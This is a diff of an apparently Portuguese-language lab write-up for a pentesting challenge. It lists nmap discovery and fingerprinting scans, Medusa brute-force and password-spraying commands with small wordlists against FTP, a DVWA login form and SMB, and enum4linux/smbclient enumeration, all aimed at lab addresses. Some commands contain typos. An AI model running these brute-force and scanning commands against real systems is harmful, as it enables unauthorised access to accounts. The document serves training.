@@ -17,64 +17,60 @@ O escaneamento inicial do ambiente foi realizado com o nmap para identificar os 
 
 Abaixo estão todos os comandos utilizados durante a fase prática do desafio, documentados para referência técnica:
 
-🔍 Fase de Reconhecimento
-📡 Descoberta de IPs ativos
+### 🔎 Fase de Reconhecimento e Descoberta de IPs ativos
 
+ifconfig
+ping -c 3 (pacotes) ip
+nmap -v -sn 192.168.56.100-110
 nmap -v -sn 192.168.56.100-200 | grep 192
+nmap -h
 
-🔎 Scan de portas abertas
+🔍 Scan de Portas e Serviços
 
-nmap -sV -p 21,22,80,445,139 192.168.0.5
+nmap -v 192.68.56.0/24
+nmap -v -sU 192.168.56.104 -p 21,22,23,445,3306
+nmap -v -sU 192.168.56.100-110 -p 21,22,23,445,3306
+nmap -sV -p 21,22,80,445,139 ip
 
-🧠 Scan avançado com fingerprinting
+🧠 Scan Avançado com Fingerprinting e Scripting
 
-sudo nmap -A 192.168.0.5
+sudo nmap -A 192.168.56.101
+sudo nmap -v -T5 -sS -Pn --open IP.0/24
+sudo nmap -v -sS -sV -TS -p 22 192.168.56.104
+sudo nmap -v -sS -sV -TS -p 22~445 192.168.56.104
+nmap --script-help exploit
+nmap -Pn -sS -sC --script exploit scanme.nmap.org
+nmap -p 80 --script dns-brute.nse nmap.org
 
 🔓 Ataques de Força Bruta
+
 1️⃣ FTP com Medusa
 
+ftp ip
 echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
 echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
-
 medusa -h 192.168.0.5 -U users.txt -P pass.txt -M ftp -t 6
-Resultado: Acesso obtido com msfadmin:msfadmin
 
 2️⃣ Web Form (DVWA)
 
+No browser ip/dvwa/login.php
 medusa -h 192.168.0.5 -U users.txt -P pass.txt -M http \
 -m PAGE:'/dvwa/login.php' \
 -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
 -m 'FAIL=Login Failed' -t 6
-
-Resultado: Vários logins válidos identificados
+medusa -M http -q
 
 3️⃣ SMB + Password Spraying
 
 echo -e "user\nmsfadmin\nservice" > smb_users.txt
-echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
-
+echo -e "password\n123456\nWelcome123\msfadmin" > senhas_spray.txt
 medusa -h 192.168.0.5 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
-Resultado: Acesso SMB com msfadmin:password
 
-📁 Enumeração de Serviços
-🔍 Enumeração SMB
+📁 Enumeração e Validação de Serviços
 
 enum4linux -a 192.168.0.5 | tee enum4_output.txt
 less enum4_output.txt
-
-📂 Listagem de compartilhamentos
 smbclient -L //192.168.0.5 -U msfadmin
-
-📸 Evidências
-
-Inclua capturas de tela organizadas na pasta /images com:
-Resultados do Nmap
-
-Ataques Medusa com [SUCCESS]
-
-Acesso ao DVWA
-
-Enumeração SMB
 
 ---
 
